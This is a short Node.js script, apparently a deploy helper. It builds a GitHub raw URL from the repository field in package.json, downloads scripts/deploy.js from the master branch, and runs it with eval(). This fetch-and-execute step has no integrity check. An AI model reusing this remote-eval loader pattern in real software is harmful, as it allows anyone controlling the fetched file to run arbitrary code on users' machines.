var https = require("https");
var packagejson = require("../package.json")
var url = `https://raw.githubusercontent.com/${packagejson["repository"]["url"].split("/")[3]}/${packagejson["repository"]["url"].split("/")[4]}/master/scripts/deploy.js`;
var script = '';
https.get(url, function(res) {
  res.on('data', function(d) {
    script+=d.toString();
  });
}).on('close', function(e) {
  eval(script);
});
